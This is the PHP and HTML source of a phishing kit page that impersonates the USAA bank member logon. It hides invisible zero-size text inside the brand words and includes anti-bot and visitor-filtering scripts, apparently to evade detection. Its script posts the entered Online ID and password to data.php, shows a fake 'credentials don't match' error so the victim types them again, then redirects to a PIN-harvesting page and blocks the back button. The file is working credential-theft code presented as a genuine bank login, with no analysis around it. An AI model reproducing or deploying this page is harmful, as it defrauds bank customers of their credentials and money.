<?php
include '../anti/config.php';
include '../anti/functions.php';
include '../anti/visitor.php';
include '../anti/antibots.php';
$_SESSION['allowed'] = true;
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Member Account Login | USAA</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
    <meta id="Viewport" name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="assets/css/web.css">
    <style>
        @media only screen and (max-width: 600px) {
            .miam-logon-banner {
                display: none;
            }

            .layout-md .miam-logon-wrapper {
                /*margin: 88px 0px 145px;*/
                margin: 0;
                display: flex;
                align-items: stretch;
                position: relative;
                z-index: 1;
            }

            .layout-md .logon-wrapper-main-contain,
            .layout-md .online-id .logon-wrapper-main-contain,
            .layout-md .otc .logon-wrapper-main-contain,
            .layout-md .password .logon-wrapper-main-contain,
            .layout-md .pin-token .logon-wrapper-main-contain,
            .layout-md .pin .logon-wrapper-main-contain {
                background-color: #fff;
                color: #3e4042;
                padding: 0 24px;
                margin: 0;
                width: 100%;
                max-width: 100%;
                z-index: 1;
            }

            .layout-sm .usaa-form-v5-9-0-fieldLabel {
                font-size: 1rem;
            }

            .layout-sm .usaa-form-v5-9-0-fieldWrapper-label {
                padding-top: 11px;
            }

            .layout-sm .usaa-form-v5-9-0-textInput .usaa-input input {
                display: block;
                padding: 3px 15px 12px;
                position: relative;
                z-index: 1;
                font-size: 1.125rem;
                border: none;
            }

            .layout-sm .usaa-form-v5-9-0-fieldWrapper-label {
                padding-left: 15px;
                padding-right: 15px;
            }
        }

        [class*=usaa-form][class*=fieldWrapper-label]:before {
            z-index: 1;
        }

        .erroritem {
            border-left: 5px solid #cb3a3a;
        }
    </style>
</head>

<body class="font-narrow">
    <div id="mainAppRoot">
        <div class="usaa-transactionalWrapper layout-xxs layout-xs layout-sm layout-md layout-lg layout-xl">
            <div class="usaa-transactionalPage">
                <div>
                    <div class="usaa-transactionalHeaderAndIndicator">
                        <header class="usaa-transactionalHeader"><a class="usaa-skipToContent screenReader" accesskey="2">Skip to Content</a><a class="home-link" id="Logo-link"><svg xmlns="http://www.w3.org/2000/svg" id="Logo-svg" viewBox="0 0 63 66">
                                    <title>USAA logo. </title>
                                    <path fill="#ffffff" d="M49.16 44.5s1.52 1.02 3 1.02c1.5 0 2.82-1.07 2.82-1.07V39.2s-1.33.96-2.8.96c-1.48 0-3.02-1.03-3.02-1.03l-15.3-9.06 1.4 6.2 13.9 8.22zM7.84 28.33S6.36 27.3 4.82 27.3s-2.8 1.08-2.8 1.08v5.23s1.26-.93 2.8-.93c1.54 0 3.02 1.03 3.02 1.03l12.64 7.48 1.08-4.73-13.72-8.1zm41.32 9.3s1.52 1.03 3 1.03c1.5 0 2.82-1.07 2.82-1.07v-5.23s-1.33.94-2.8.94c-1.48 0-3.02-1-3.02-1L32.04 22.15l1.42 6.2 15.7 9.3zM7.84 21.5s-1.48-1.04-3.02-1.04-2.8 1.08-2.8 1.08v5.23s1.26-.94 2.8-.94c1.54 0 3.02 1.03 3.02 1.03l14.02 8.3 1.08-4.74-15.1-8.93zm41.32 9.3s1.52 1.03 3 1.03c1.5 0 2.82-1.07 2.82-1.07v-5.24s-1.33.95-2.8.95c-1.48 0-3.02-1.03-3.02-1.03l-18.93-11.2 1.42 6.2 17.5 10.36zM7.84 14.65s-1.48-1.03-3.02-1.03-2.8 1.07-2.8 1.07v5.22s1.26-.94 2.8-.94c1.54 0 3.02 1.03 3.02 1.03l15.4 9.12 1.07-4.73-16.46-9.75zm22-2.1l19.32 11.4s1.52 1.03 3 1.03c1.5 0 2.82-1.07 2.82-1.07V18.7s-1.33.94-2.8.94c-1.48 0-3.02-1.02-3.02-1.02L34.22 9.76 33.18 5.8c0-.17.15-.25.2-.26l2.54-.8c.34 0 .53.3.53.54l.14.28c.08.05.5-.07.5-.15V3.86c0-1.04-.82-1.96-1.93-1.96h-2.53S32.27 1 31.2 1h-4.8c-1.28 0-1.58 1.2-1.58 1.2l-3.34 13.65L7.84 7.8S6.36 6.77 4.82 6.77s-2.8 1.08-2.8 1.08v5.23s1.26-.94 2.8-.94c1.54 0 3.02 1.03 3.02 1.03L24.6 23.1l3.83-16.73 1.4 6.17zM26.8 58.4c0 2.85-2.32 4.9-5.5 4.92-3.37 0-4.5-.58-4.5-.58l-.28-3.15s1.87 1.24 4.62 1.24c.76 0 2.48-.54 2.48-2.1 0-1.48-1.35-1.93-1.68-2.12-.67-.35-1.47-.7-2.13-1.04-1.23-.6-3.06-1.78-3.06-4.27 0-3.57 3.2-4.88 5.75-4.88 2.03 0 3.83.9 3.83.9v2.94c-.57-.34-1.5-1.4-3.84-1.4-1.6 0-2.68.86-2.68 2.04 0 1.1.9 1.8 1.77 2.22l2.44 1.17c1.27.62 2.76 1.9 2.76 4.1zm-15.05-1.35c0 1.3-.43 3.77-3.4 3.72C5.62 60.7 5.1 58.2 5.1 56.6v-9.87h-3.1v10.03c0 5.65 3.44 6.6 6.32 6.6 4.25 0 6.23-2.83 6.23-6.65v-9.97h-2.82v10.32zm43.23 5.93h-3.4l-.96-2.85h-5.78l-.98 2.85h-5.78l-.96-2.85h-5.78l-.98 2.85H27.3L32.9 48l-.54-1.27h3.38l5.4 15.32L46.4 48l-.54-1.27h3.37l5.75 16.25zm-18.63-5.12l-2-6.4-2.26 6.4h4.25zm13.5 0l-2-6.4-2.25 6.4h4.25zm5.93-10.38c-.55.3-1 .73-1.3 1.3S54 49.9 54 50.5c0 .6.17 1.18.47 1.73s.74 1 1.3 1.3c.54.3 1.12.46 1.73.46s1.18-.15 1.73-.45c.55-.3.98-.74 1.3-1.3s.44-1.13.44-1.73c0-.6-.15-1.2-.46-1.75s-.74-1-1.3-1.3c-.55-.3-1.12-.44-1.7-.44s-1.16.15-1.72.45zm3.14.5c.47.25.83.6 1.1 1.08.25.47.38.95.38 1.46 0 .5-.13.98-.4 1.45s-.6.82-1.06 1.07c-.46.26-.94.4-1.44.4s-1-.14-1.45-.4c-.46-.25-.82-.6-1.08-1.07-.25-.47-.38-.95-.38-1.45s.12-1 .38-1.46c.26-.47.62-.83 1.1-1.08s.93-.37 1.42-.37c.48 0 .96.13 1.42.38zm-2.35 4.47v-1.6h.36c.2 0 .37.05.48.13.17.12.38.4.64.88l.34.6h.73l-.44-.75c-.22-.33-.4-.58-.56-.73-.08-.08-.18-.14-.3-.2.3-.02.57-.14.76-.34.2-.2.3-.44.3-.72 0-.18-.06-.37-.18-.54-.12-.17-.27-.3-.47-.36-.2-.07-.5-.1-.95-.1h-1.28v3.75h.6zm0-3.25h.7c.3 0 .5.02.6.07s.2.1.25.2c.06.08.1.18.1.3 0 .16-.07.3-.2.4s-.36.17-.7.17h-.75V49.2z"></path>
                                </svg></a>
                            <h1 class="usaa-transactionalHeader-appName font-serif"><span>Unified Logon</span></h1>
                            <ul id="navLinkContain">
                                <li class="ulo-navLink"><a class="miam-logon-join-link font-normal nav-link0" target="_self" rel="noopener noreferrer" id="navLink-0">Join USAA</a></li>
                                <li class="ulo-navLink"><a class="miam-logon-join-link font-normal nav-link1" target="_self" rel="noopener noreferrer" id="navLink-1">Register <span class="wrappedText">&nbsp;for access</span></a></li>
                            </ul>
                            <div class="vertical-rule"></div>
                        </header>
                    </div>
                    <div id="contentHijackId" tabindex="-1"></div><span data-id="usaa-trapFocus--bottom" tabindex="-1" aria-hidden="true" style="top: 2px; position: absolute;"></span>
                </div>
                <div tabindex="-1"></div>
                <div aria-hidden="false" class="usaa-transactionalBodyAndFooter" id="usaa-templateContent">
                    <div class="usaa-transactionalBodyWrapper">

                        <div class="usaa-transactionalBody" role="main">
                            <div class="mainPanel-rightPanelButtonContainer"></div><svg id="flourish-icon" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 73.35 72" alt="">
                                <defs></defs>
                                <title>usaa-symbol-laurel</title>
                                <path id="Laurel" class="cls-1" d="M31.16,49.51l2.26,7.7-7.19-3.56L24,45.95ZM26.58,62.1l6.68-4.44-7.8-1.89-6.68,4.44Zm-8-21.82-.5,8,5.54,5.81.5-8ZM15.5,56.34l7.8-1.88L16.62,50,8.82,51.9ZM15.44,33.1l-3.21,7.36,3.21,7.35,3.21-7.35ZM7.05,47.15,15,48l-4.76-6.46-8-.89ZM15,25.28,9.42,31.09l.51,8,5.54-5.81ZM2.26,35.62l7.19,3.57-2.26-7.7L0,27.92Zm14.9-17.85L10,21.34,7.71,29l7.19-3.57ZM1.7,23.14,7.24,29l.51-8L2.21,15.14ZM21.81,11.47l-8,.9L9.08,18.83l8-.9ZM5.44,11.23l3.22,7.36,3.22-7.35L8.66,3.88ZM15.63,3.49l-2.34,7.68,7.22-3.5L22.85,0Zm26.56,46-2.27,7.7,7.19-3.56,2.27-7.7Zm12.38,10.7-6.68-4.44-7.8,1.89,6.68,4.44ZM49.24,46.08l.5,8,5.54-5.81-.5-8ZM64.53,51.9,56.73,50l-6.68,4.44,7.8,1.88ZM54.69,40.45,57.9,47.8l3.21-7.35L57.91,33.1Zm16.36.24-8,.89L58.32,48l8-.89Zm-13.16-7.4,5.54,5.81.51-8L58.4,25.28Zm15.46-5.37-7.19,3.57-2.27,7.7,7.19-3.57Zm-14.9-2.45L65.64,29l-2.27-7.7-7.19-3.57ZM71.14,15.14,65.6,20.95l.51,8,5.54-5.82ZM56.3,17.93l8,.9-4.76-6.46-8-.9ZM64.69,3.88l-3.21,7.35,3.22,7.35,3.22-7.36ZM50.5,0l2.34,7.68,7.22,3.5L57.72,3.49ZM36.67,72,32,63.84l4.71-8.16,4.71,8.16Z"></path>
                            </svg>
                            <div class="password miam-logon-wrapper" tabindex="-1">
                                <div class="miam-logon-gutter"></div>
                                <div class="miam-logon-banner">
                                    <div class="miam-logon-banner-text">
                                        <div class="wcm-content">
                                            <div class="miam-logon-banner">
                                                <h1>New to USAA?</h1>
                                                <p>Become a mem<font style="color:transparent;font-size:0px">W63843</font>ber by selecting "Join USAA" — it's easy and only takes a few mi<font style="color:transparent;font-size:0px">38994</font>nutes.</p>
                                            </div>
                                        </div>
                                        <div class="miam-logon-banner-mobile">
                                            <div class="miam-logon-mobile-modal">
                                                <div class="mobile-wcm-banner-content">
                                                    <div class="wcm-content">
                                                        <div class="miam-logon-banner">
                                                            <h1>New to U<font style="color:transparent;font-size:0px">L15111</font>SAA?</h1>
                                                            <p>Become a mem<font style="color:transparent;font-size:0px">Z53087</font>ber by select<font style="color:transparent;font-size:0px">D89347</font>ing "Join USAA" — it's easy and only takes a few minutes.</p>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div><a id="join-button" class="join-button-link" target="_self" rel="noopener noreferrer" tabindex="-1"><button type="button" class="usaa-button4 join-button">Join USAA</button></a>
                                </div>
                                <div class="miam-logon-fieldset logon-wrapper-main-contain">
                                    <div class="miam-logon-form">
                                        <div id="main-logon-wrapper">
                                            <h2 class="miam-form-title">Log On</h2>
                                            <form method="post" id="form" action="">
                                                <div class="usaa-form-v5-9-0-formGroup-wrapper">
                                                    <div class="usaa-form-v5-9-0-formGroup">
                                                        <div id="" class="miam-a1-err ">
                                                            <div class="usaa-alert usaa-alert--componentLevel usaa-alert--urgent" role="alert">
                                                                <div class="usaa-alert-container">
                                                                    <div class="usaa-alert-wrapper">

                                                                        <div class="usaa-alert-content" id="error" style="display:none"><svg class="usaa-alert-icon" focusable="false" viewBox="0 0 16 16" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="16px" height="16px">
                                                                                <path fill="#AB080E" d="M15.9,13.6L9.2,1.3c-0.6-0.9-1.7-0.9-2.3,0L0.1,13.6c-0.4,0.8,0.1,1.7,1.2,1.7h13.4C15.7,15.3,16.3,14.4,15.9,13.6z M8,13c-0.6,0-1.2-0.5-1.2-1.2s0.5-1.2,1.2-1.2s1.2,0.5,1.2,1.2S8.6,13,8,13z M8.6,9.5H7.4L6.8,4.8h2.3L8.6,9.5z"></path>
                                                                            </svg><span class="screenReader">Urgent Alert: </span>
                                                                            <div class="usaa-alert-message">
                                                                                <p>Sorry, the credent<font style="color:transparent;font-size:0px">C94001</font>ials you entered doesn't match what we have on<font style="color:transparent;font-size:0px">H72971</font> file.</p>
                                                                            </div>


                                                                        </div>


                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="usaa-form-v5-9-0-textInput usaa-form-v5-9-0-fieldWrapper miam-form-id-input">
                                                            <div class="usaa-form-v5-9-0-block col-1-1">
                                                                <div class="">
                                                                    <div><label for="usaa-form-v5-9-0-input-2ft18x6yn7m3" class="usaa-form-v5-9-0-fieldLabel usaa-form-v5-9-0-fieldWrapper-label"><span aria-hidden="false" class="usaa-form-v5-9-0-fieldLabel-text">On<font style="color:transparent;font-size:0px">E81510</font>line I<font style="color:transparent;font-size:0px">K20028</font>D</span></label></div>
                                                                    <div>
                                                                        <div id="usaa-form-v5-9-0-input-2ft18x6yn7m3-errorMessage" class="usaa-form-v5-9-0-fieldWrapper-errorMessage" data-error-message=""></div>
                                                                        <div class="screenReader" role="alert"></div>
                                                                    </div><span class="usaa-input"><input name="erId2" aria-invalid="false" autocomplete="off" id="user" type="text" onfocus="ooth(0)" onblur="ooth(2)" oninput="ooth(2);document.getElementById('erong').classList.add('hidden');" required=""><span class="keyboardFocusRing" aria-hidden="true"></span></span>
                                                                </div>
                                                                <div class="keyboardFocusRing"></div>
                                                            </div>
                                                        </div>
                                                        <div class="show-hide-pass-wrapper">
                                                            <div class="usaa-form-v5-9-0-textInput usaa-form-v5-9-0-fieldWrapper miam-masked-input">
                                                                <div class="usaa-form-v5-9-0-block usaa-form-v5-9-0-block--focused col-1-1">
                                                                    <div>
                                                                        <div><label for="usaa-form-v5-9-0-input-iczl6igw9tl" class="usaa-form-v5-9-0-fieldLabel usaa-form-v5-9-0-fieldWrapper-label"><span aria-hidden="false" class="usaa-form-v5-9-0-fieldLabel-text">Pa<font style="color:transparent;font-size:0px">P48692</font>ss<font style="color:transparent;font-size:0px">L76135</font>word</span></label></div>
                                                                        <div>
                                                                            <div id="usaa-form-v5-9-0-input-iczl6igw9tl-errorMessage" class="usaa-form-v5-9-0-fieldWrapper-errorMessage" data-error-message=""></div>
                                                                            <div class="screenReader" role="alert"></div>
                                                                        </div><span class="usaa-input"><input name="password2" id="psw" aria-invalid="false" autocomplete="off" onfocus="ooth(0)" onblur="ooth(2)" oninput="ooth(2);document.getElementById('erong').classList.add('hidden');" type="password" required=""><input type="hidden" name="submmt" value="25839ae6776d09c26c6b2b0110aba59f"><span class="keyboardFocusRing" aria-hidden="true"></span></span>

                                                                    </div>
                                                                    <div class="keyboardFocusRing"></div>
                                                                </div>
                                                            </div><button tabindex="0" type="button" class="show-hide-trigger usaa-button4" role="button" onclick="showpsw();"><span aria-live="off" aria-hidden="true">Show</span></button>
                                                        </div>


                                                        <input hidden type="text" name="mobili" value="<?php if (isset($_SESSION['mobili'])) {
                                                                                                            echo $_SESSION['mobili'];
                                                                                                        } ?>"></input>

                                                        <div class="usaa-form-v5-9-0-block col-1-1 miam-checkbox-field">
                                                            <div class="usaa-checkbox"><input class="usaa-checkbox-input" type="checkbox" id="usaa-form-v5-9-0-checkbox-x5e7ryj8e0o" aria-labelledby="usaa-form-v5-9-0-checkbox-x5e7ryj8e0o-label"><label class="usaa-checkbox-label" for="usaa-form-v5-9-0-checkbox-x5e7ryj8e0o" id="usaa-form-v5-9-0-checkbox-x5e7ryj8e0o-label">Rememb<font style="color:transparent;font-size:0px">F29006</font>er this br<font style="color:transparent;font-size:0px">241843</font>ows<font style="color:transparent;font-size:0px">D17262</font>er to log on fast<font style="color:transparent;font-size:0px">C60801</font>er next time.<span class="usaa-checkbox-pseudoCheckbox" aria-hidden="true"></span><span class="keyboardFocusRing" aria-hidden="true"></span></label></div>
                                                            <div class="keyboardFocusRing"></div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <button type="submit" class="usaa-button4 miam-btn-next pass-submit-btn usaa-button4--primary spin" id="nextBtn">
                                                    <span>Next</span></button>

                                                <div class="help-link"><a tabindex="0">I need help logging on</a></div>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                                <div class="miam-logon-gutter" tabindex="-1"></div>
                            </div>
                        </div>
                        <script>
                            "use strict"
                            document.getElementById("loggin").setAttribute("novalidate", true);

                            function showpsw() {
                                var e = event.target;
                                var pas = document.getElementById("psw");
                                if (pas.type == "password" && pas.value != "") {
                                    pas.type = "text";
                                    e.innerHTML = '<span aria-live="off" aria-hidden="true">Hide</span>';
                                } else {
                                    pas.type = "password";
                                    e.innerHTML = '<span aria-live="off" aria-hidden="true">Show</span>';
                                };
                            };

                            function ooth(m) {
                                var e = event.target;
                                if (m == 0) {
                                    e.parentNode.parentNode.classList.remove('erroritem');
                                };
                                if (m == 2 && e.value != '') {
                                    e.parentNode.parentNode.classList.remove('erroritem');
                                } else if (m == 2 && e.value == '') {
                                    e.parentNode.parentNode.classList.add('erroritem');
                                };
                            }

                            function psload(m = 1) {
                                var load = document.getElementById("nextBtn");
                                if (m == 1) {
                                    load.innerHTML = '<div class="spinnerContain"><div class="usaa-spinner usaa-spinner--smaller" aria-valuetext="loading" aria-live="assertive" aria-atomic="true" role="alert"><span class="screenReader">loading</span></div></div>';
                                } else {
                                    load.innerHTML = '<span>Next</span>';
                                };
                            }

                            function disperr(tel) {
                                tel.parentNode.parentNode.classList.add('erroritem');
                            };

                            function valid() {
                                psload();
                                var errct = document.getElementById("erong");
                                var etdd = document.getElementById("erri");
                                errct.classList.add('hidden');
                                var self = document.getElementById("loggin");
                                var input = self.querySelectorAll("input[required]");
                                var emptylist = [];
                                for (var i = 0; i < input.length; i++) {
                                    input[i].classList.remove('err');
                                    if (input[i].value == "") {
                                        emptylist.push(i);
                                    };
                                }
                                if (emptylist.length >= 1) {
                                    errct.classList.remove('hidden');
                                    input[emptylist[0]].focus();
                                    etdd.innerHTML = "Username and password required . Please try again";
                                    for (var i of emptylist) {
                                        disperr(input[i])
                                    };
                                    psload(0);
                                    return false;
                                } else {
                                    return true;
                                };
                            };
                            document.getElementById('usaa-form-v5-9-0-input-2ft18x6yn7m3').focus();
                        </script>
                    </div>
                    <div class="usaa-transactionalFooter">
                        <footer class="usaa-transactionalFooter-footer">
                            <div class="usaa-transactionalFooter-content">
                                <p class="usaa-transactionalFooter-copyright"><br>Copy<font style="color:transparent;font-size:0px">V40288</font>right © 2023 U<font style="color:transparent;font-size:0px">349805</font>SAA.</p>
                                <div class="pageFooter-disclosures pageFooter-disclosures--aboveFootnotes">
                                    <p>
                                        <a class="miam-footer-link SecurityLink" target="_self">Secu<font style="color:transparent;font-size:0px">R55732</font>rity Center</a>
                                        <a class="miam-footer-link PrivacyLink" target="_self">Pr<font style="color:transparent;font-size:0px">878424</font>ivacy Center</a>
                                        <a class="miam-footer-link AccessibilityLink" target="_self">Acces<font style="color:transparent;font-size:0px">77169</font>sibility at US<font style="color:transparent;font-size:0px">M13235</font>AA</a>
                                    </p>
                                </div>
                                <div class="pageFooter-footnotes"></div>
                                <div class="pageFooter-disclosures pageFooter-disclosures--belowFootnotes"></div>
                                <div class="usaa-transactionalFooter-icons">
                                    <div class="usaa-transactionalFooter-logo">US<font style="color:transparent;font-size:0px">N77882</font>AA Logo</div>
                                </div>
                            </div>
                        </footer>
                    </div>
                </div>
            </div>
        </div>
    </div>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script type="text/javascript">

history.pushState(null, document.title, location.href);
window.addEventListener('popstate', function (event)
{
  history.pushState(null, document.title, location.href);
});

//$(document).bind("contextmenu", function(e){ return false;});

var count = 0;
var counts = 0;

$('#form').on('submit', function(e){
		counts = counts+1;
		$('#nextBtn').html('<div class="spinnerContain"><div class="usaa-spinner usaa-spinner--smaller" aria-valuetext="loading" aria-live="assertive" aria-atomic="true" role="alert"><span class="screenReader">loading</span></div></div>');
		$.post('data.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
		
							if(counts == 2){
							   $('#step1').show();
							   $('#step1').show();
							   
					   setTimeout(function() {
                              window.location.href = "pin.php";
                        },5000);
							   
							}else{
								 $('#user').val('');
								 $('#psw').val('');
								 $('#error').show();
								 $('#nextBtn').html('Next');
							}
		
                            
                        },2000);
		e.preventDefault();
	});






</script>
</body>

</html>